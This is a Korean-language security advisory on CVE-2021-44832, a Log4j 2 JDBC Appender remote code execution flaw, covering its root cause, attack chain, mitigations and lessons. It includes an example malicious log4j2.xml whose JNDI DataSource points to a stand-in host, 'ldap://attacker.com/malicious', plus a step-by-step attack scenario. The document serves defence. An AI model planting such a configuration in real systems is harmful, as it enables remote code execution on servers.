# CVE-2021-44832 - Log4j 2 JDBC Appender RCE

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2021-44832 |
| CVSS | 6.6 (Medium) |
| 영향 소프트웨어 | Apache Log4j 2 |
| 영향 버전 | 2.0-alpha7 ~ 2.17.0 (2.3.2, 2.12.4 제외) |
| 수정 버전 | 2.17.1 (Java 8+), 2.12.4 (Java 7), 2.3.2 (Java 6) |
| 공격 유형 | RCE (Remote Code Execution) |
| 발견일 | 2021-12-28 |

## 영향 범위 & 심각성

Log4Shell 시리즈의 네 번째 취약점으로, 이전 취약점들보다 악용 조건이 까다롭다.

- **전제 조건**: 공격자가 Log4j 설정 파일(log4j2.xml)을 수정할 수 있어야 함
- CVSS가 6.6으로 상대적으로 낮지만, 설정 파일 접근이 가능한 내부자 위협에서 유효
- 공유 호스팅, 멀티테넌트 환경에서 테넌트 간 격리가 불충분하면 위험
- Log4Shell 대응 과정에서 2.17.0까지 업데이트한 조직도 재차 업데이트 필요
- 공급망 공격을 통해 설정 파일이 변조되는 시나리오에서 연쇄 악용 가능

## 취약점 기술 분석

### 근본 원인

Log4j의 JDBC Appender가 설정 파일에 지정된 JNDI DataSource를 참조할 때, 원격 JNDI 리소스를 제한 없이 로드할 수 있었다.

```xml
<!-- log4j2.xml - 악성 설정 예시 -->
<Configuration>
  <Appenders>
    <JDBC name="databaseAppender" tableName="logs">
      <DataSource jndiName="ldap://attacker.com/malicious" />
      <Column name="message" pattern="%m"/>
    </JDBC>
  </Appenders>
  <Loggers>
    <Root level="info">
      <AppenderRef ref="databaseAppender"/>
    </Root>
  </Loggers>
</Configuration>
```

### 공격 체인

1. 공격자가 설정 파일 수정 권한 획득 (별도 취약점 필요)
2. JDBC Appender의 DataSource에 악성 JNDI URL 삽입
3. Log4j가 설정을 리로드하면 JNDI를 통해 원격 객체 로드
4. 악성 Java 클래스가 실행되어 RCE 달성

## 공격 시나리오

```
1단계: 대상 시스템의 Log4j 설정 파일 접근 권한 확보
       - 관리 인터페이스 취약점, 파일 업로드 취약점 등 활용
       - 또는 내부자 위협 시나리오
2단계: log4j2.xml에 악성 JDBC Appender 설정 삽입
3단계: 설정 자동 리로드(monitorInterval) 또는 애플리케이션 재시작 대기
4단계: JNDI를 통해 공격자 LDAP 서버에서 악성 클래스 로드
5단계: 서버에서 임의 코드 실행
```

```xml
<!-- 자동 리로드 설정이 있는 경우 더 위험 -->
<Configuration monitorInterval="30">
  <!-- 30초마다 설정 파일 변경 감시 → 악성 설정 자동 적용 -->
</Configuration>
```

## 방어 방법

1. **Log4j 업데이트**: 2.17.1 이상으로 업그레이드
2. **설정 파일 보호**: log4j2.xml의 파일 퍼미션을 최소화 (읽기 전용)
3. **JNDI 프로토콜 제한**: 2.17.1부터 JDBC DataSource에서 JNDI 사용 시 java 프로토콜만 허용
4. **자동 리로드 비활성화**: `monitorInterval` 설정 제거 또는 파일 무결성 모니터링
5. **네트워크 제한**: 서버의 아웃바운드 LDAP/RMI 트래픽 차단
6. **파일 무결성 모니터링**: 설정 파일 변경 시 알림 (OSSEC, Wazuh 등)

## 교훈

- **설정 파일도 코드다**: 설정 파일에 대한 접근 제어도 소스 코드와 동일한 수준으로 관리
- **최소 권한 원칙**: 설정 파일 변경 권한은 배포 파이프라인에만 부여
- **JNDI는 본질적으로 위험**: 외부 리소스를 동적으로 로드하는 모든 기능은 잠재적 RCE 벡터
- **연쇄 취약점 고려**: 단독으로는 위험도가 낮아도, 다른 취약점과 결합하면 Critical 수준
- **Log4j 의존성 완전 제거 검토**: 반복되는 취약점 발생 시 대안 로깅 프레임워크 검토

## 참고 자료

- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [NVD - CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832)
- [Checkmarx Blog - CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)
- [CISA Log4j Guidance](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
